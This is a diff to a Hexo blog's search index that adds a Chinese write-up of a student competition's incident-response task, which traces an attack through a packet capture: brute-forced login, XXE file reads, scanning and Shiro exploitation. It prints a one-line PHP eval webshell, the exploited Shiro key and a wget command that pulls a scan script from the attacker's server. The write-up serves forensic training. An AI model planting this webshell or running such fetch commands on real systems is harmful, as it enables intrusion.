@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>2025京津冀大学生信息安全网络攻防-应急响应任务一</title>
+      <link href="/2025/10/16/2025%E4%BA%AC%E6%B4%A5%E5%86%80%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%BB%BB%E5%8A%A1%E4%B8%80/"/>
+      <url>/2025/10/16/2025%E4%BA%AC%E6%B4%A5%E5%86%80%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%BB%BB%E5%8A%A1%E4%B8%80/</url>
+      
+        <content type="html"><![CDATA[<h3 id="子任务01"><a href="#子任务01" class="headerlink" title="子任务01"></a>子任务01</h3><p>攻击者公网IP和受害者公网IP(空格分隔)</p><img src=/jpg/JJJ/1.png><p>流量包粗略的看了看有一些爆破的流量，IP为：<code>223.104.3.160</code> 初步确定攻击者IP</p><p>详细筛选流量包：<code>http.request.method==&quot;POST&quot;</code></p><img src=/jpg/JJJ/2.png><p>可以看到客户端的Host为：<code>152.136.134.254</code>，返回看一下攻击者的IP和我们初步确认的IP为同一个，所以这里直接确定这就是正确的攻击者IP和受害者IP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">223.104.3.160 152.136.134.254</span><br></pre></td></tr></table></figure><h3 id="子任务02"><a href="#子任务02" class="headerlink" title="子任务02"></a>子任务02</h3><p>攻击者通过暴力破解得到的账号密码(格式：账号&#x2F;密码)</p><img src=/jpg/JJJ/3.png><p>拿到题目看到是爆破，直接筛POST参数：<code>http.request.method==&quot;POST&quot;</code></p><p>这里可以看到会有一大堆的POST请求都是请求的<code>/login.php</code>按照默认顺序直接翻到最后一个&#x2F;login.php的流量包，</p><img src=/jpg/JJJ/4.png><p>这里直接找到账号密码：<code>admin</code>&#x2F;<code>password</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/password</span><br></pre></td></tr></table></figure><h3 id="子任务03"><a href="#子任务03" class="headerlink" title="子任务03"></a>子任务03</h3><p>攻击者通过XXE漏洞读取了哪些文件(按照攻击者的读取顺序，以英文的逗号分隔，使用绝对路径列出)</p><img src=/jpg/JJJ/5.png><p>在上一个题目做题的过程中可以看到会有XXE这一类的命令，所以我们直接往上翻一下第一条登录成功的数据包。</p><img src=/jpg/JJJ/7.png><p>可以看到这是使用xxe读取的第一个文件：<code>/etc/passwd</code></p><img src=/jpg/JJJ/8.png><p>这里按照顺序看下一个数据包找到第二个文件:<code>/etc/hosts</code></p><img src=/jpg/JJJ/9.png><p>继续往下看这里找到第三个文件：<code>/etc/os-release</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd,/etc/hosts,/etc/os-release</span><br></pre></td></tr></table></figure><h3 id="子任务04"><a href="#子任务04" class="headerlink" title="子任务04"></a>子任务04</h3><p>攻击者对哪个目录进行了目录遍历(例：<a href="http://1.2.3.4:5555/admin/">http://1.2.3.4:5555/admin/</a>)</p><img src=/jpg/JJJ/10.png><p>这里看到题目是目录遍历，所以我们直接筛GET请求：<code>http.request.method==&quot;GET&quot;</code></p><img src=/jpg/JJJ/11.png><p>筛过之后发现会有很多请求GET &#x2F;hfghjkrtylkg&#x2F;*，很明显就是在爆破这个目录，所以答案就是&#x2F;hfghjkrtylkg&#x2F;，我们随机追踪一个http，看到Host：<code>152.136.134.254:9999</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://152.136.134.254:9999/hfghjkrtylkg/</span><br></pre></td></tr></table></figure><h3 id="子任务05"><a href="#子任务05" class="headerlink" title="子任务05"></a>子任务05</h3><p>攻击者写入第一个webshell的内容(请直接将请求内容提取出来，并进行相关解码操作，将进行完全匹配)</p><img src=/jpg/JJJ/12.png><img src=/jpg/JJJ/13.png><p>看到GET请求下最后有一些传参，之前在POST请求下也看到过一些eval传参</p><p>注意：千万不要被误导，POST传参的eval就是用来误导我们的，做题过程中主包就是被误导了白白浪费一次提交机会。</p><img src=/jpg/JJJ/14.png><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php foreach($_POST as $a)&#123; $code = $a; &#125; eval($code); ?&gt;</span><br></pre></td></tr></table></figure><h3 id="子任务06"><a href="#子任务06" class="headerlink" title="子任务06"></a>子任务06</h3><p>攻击者使用什么webshell连接工具连接的一句话木马(格式：webshell工具名称&#x2F;版本)</p><img src=/jpg/JJJ/15.png><p>这里看到题目的时候主包心里就已经有答案了，但是最后备注的格式需要加版本，所以就浪费了一点时间，想了想版本号一般会在哪显示，翻了翻蚁剑的流量，同样也是筛POST请求找到2.php就可以了，突然想起来UA头没看</p><img src=/jpg/JJJ/16.png><p>所以这里答案也出来了：<code>antSword/v2.1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">antSword/v2.1</span><br></pre></td></tr></table></figure><h3 id="子任务07"><a href="#子任务07" class="headerlink" title="子任务07"></a>子任务07</h3><p>攻击者使用的php扫描脚本的名称，传递的IP地址范围、端口、超时时间(例：aaa.php;192.168.1.10;21,22,23,80,100,2333;3s)</p><img src=/jpg/JJJ/17.png><p>继续筛POST请求，因为主包在做前面的题的时候注意到了这个php扫描脚本</p><img src=/jpg/JJJ/18.png><p>看到这个scan.php这里startip代表的就是起始ip，endip就是最终ip，port就是端口，timeout就是超时时间。</p><p>按照题目要求汇总成对应的格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scan.php;172.18.0.1-172.18.0.254;80,8080;0.5s</span><br></pre></td></tr></table></figure><h3 id="子任务08"><a href="#子任务08" class="headerlink" title="子任务08"></a>子任务08</h3><p>攻击者使用webshell连接工具的虚拟终端，执行的前3条命令(命令间用英文逗号分隔)</p><img src=/jpg/JJJ/19.png><p>这个题分值很高，难度不算太高，但是里面有很多误导主包的数据包，分辨起来就很麻烦，而且这里提交flag次数有限制。所以就浪费了主包很多次机会。</p><p>这里我们已经知道使用的webshell是蚁剑了，所以我们直接去找对应的流量就可以了，蚁剑的流量执行的命令会在最后的数据中，仅仅只是base64加密。</p><img src=/jpg/JJJ/20.png><img src=/jpg/JJJ/24.png><img src=/jpg/JJJ/26.png><p>这里我们去解密</p><img src=/jpg/JJJ/21.png><img src=/jpg/JJJ/22.png><img src=/jpg/JJJ/25.png><p>看到执行了很多条命令，一开始主包以为前三条就是密码，所以就直接提交了，而且还改了顺序提交了好多次，依旧失败。</p><p>在最后主包详细去攻克的时候发现，下面的数据包的命令和上面的命令几乎一致，但是就一个命令不一样，所以主包就把不同的命令组合在一起提交发现成功了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig,whoami,uname -a</span><br></pre></td></tr></table></figure><h3 id="子任务09"><a href="#子任务09" class="headerlink" title="子任务09"></a>子任务09</h3><p>攻击者进行攻击所使用的VPS的IP地址</p><img src=/jpg/JJJ/27.png><p>VPS想必都不陌生了，但是这里还是需要给一些刚入门的小白解释一下，VPS的IP地址是分配给该虚拟机服务器专用的互联网协议地址（独一无二）</p><p>在做之前的题的时候我们注意到一个ping.sh的脚本，从命名中可以看出来，这是一个关于测试网络连通性的脚本</p><p>既然是测试网络连通性，那一定会用到公网IP，所以这就是这道题的突破口</p><img src=/jpg/JJJ/28.png><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">39.102.37.102</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 虚拟专用服务器（Virtual Private Server，VPS），是通过容器技术或虚拟化技术将物理服务器分割为多个虚拟服务器的托管服务 。其核心特征是为每个虚拟服务器分配独立公网IP地址、独立操作系统以及磁盘空间、内存、CPU资源，实现用户间系统配置隔离，支持自主安装程序及重启操作系统。</span></span><br><span class="line"><span class="comment"># 该技术采用操作系统虚拟化共享底层硬件资源，提供介于传统虚拟主机与独立服务器之间的资源分配方案，可灵活满足不同用户需求。主要应用于网站托管、电子商务平台搭建、数据共享、在线游戏服务及企业虚拟化领域，租用成本约为独立服务器的1/4至1/5。实际性能受服务商硬件配置及超售策略影响，容器技术因硬件效率较高通常定价高于虚拟机技术</span></span><br></pre></td></tr></table></figure><h3 id="子任务10"><a href="#子任务10" class="headerlink" title="子任务10"></a>子任务10</h3><p>攻击者攻击内网机器172.18.0.3时所使用的漏洞的CVE编号</p><img src=/jpg/JJJ/30.png><p>在找爆破的账号密码的时候主包也发现了攻击者利用shiro，所以我们直接去找shiro的流量包</p><img src=/jpg/JJJ/31.png><p>很明显Cookie中存在rememberMe字段，所以我们直接去查对用的CVE编号就可以了</p><img src=/jpg/JJJ/32.png><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2016-4437</span><br></pre></td></tr></table></figure><h3 id="子任务11"><a href="#子任务11" class="headerlink" title="子任务11"></a>子任务11</h3><p>攻击者利用shiro漏洞的密钥是什么</p><img src=/jpg/JJJ/33.png><p>这一题就是找shiro的密钥了，我们既然找到了cookie那直接BlueTeam工具箱一把梭</p><img src=/jpg/JJJ/34.png><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br></pre></td></tr></table></figure><h3 id="子任务12"><a href="#子任务12" class="headerlink" title="子任务12"></a>子任务12</h3><p>攻击者得到172.18.0.3的shell后执行的前3条命令(逗号分隔)</p><img src=/jpg/JJJ/35.png><p>还是shiro利用，但是一开始没做出来，做完子任务13发现了12的答案，嘿嘿</p><img src=/jpg/JJJ/42.png><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami,pwd,uname -a</span><br></pre></td></tr></table></figure><h3 id="子任务13"><a href="#子任务13" class="headerlink" title="子任务13"></a>子任务13</h3><p>攻击者在172.18.0.3机器上拿到的ssh私钥的后8位是什么(等号也算)</p><img src=/jpg/JJJ/36.png><p>直接Ctrl+F，搜索.ssh，然后找到下面这个.ssh#追踪数据包</p><img src=/jpg/JJJ/38.png><img src=/jpg/JJJ/39.png><p>看到这里就是最后答案<code>DsOGnok=</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DsOGnok=</span><br></pre></td></tr></table></figure><h3 id="子任务14"><a href="#子任务14" class="headerlink" title="子任务14"></a>子任务14</h3><p>攻击者下载内网扫描的shell脚本使用的命令是什么</p><img src=/jpg/JJJ/43.png><p>还是使用子任务13追踪的数据包，继续往下看</p><img src=/jpg/JJJ/44.png><p>可以看到使用的内网扫描的工具是<code>ping.sh</code>，所以这里答案就是：<code>wget http://39.102.37.102/ping.sh</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://39.102.37.102/ping.sh</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 应急响应 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 应急响应 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>DC-1靶机</title>
       <link href="/2025/05/17/Dc-1%E9%9D%B6%E6%9C%BA/"/>
       <url>/2025/05/17/Dc-1%E9%9D%B6%E6%9C%BA/</url>
@@ -93,17 +118,6 @@
     
     
     <entry>
-      <title>大神博客</title>
-      <link href="/link/index.html"/>
-      <url>/link/index.html</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>标签</title>
       <link href="/tags/index.html"/>
       <url>/tags/index.html</url>
@@ -120,6 +134,17 @@
       <url>/music/index.html</url>
       
         <content type="html"><![CDATA[<!-- #<script>console.error("Error: [hexo-tag-aplayer] Meting support is disabled, cannot resolve the meting tags properly.");</script><div class="aplayer" data-id="8492133976" data-server="netease" data-type="playlist"  data-fixed="true" data-theme="#3F51B5"></#div> --><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=795 height=550 src="//music.163.com/outchain/player?type=0&id=6678743774&auto=1&height=430"></iframe>]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>大神博客</title>
+      <link href="/link/index.html"/>
+      <url>/link/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
       
     </entry>
     
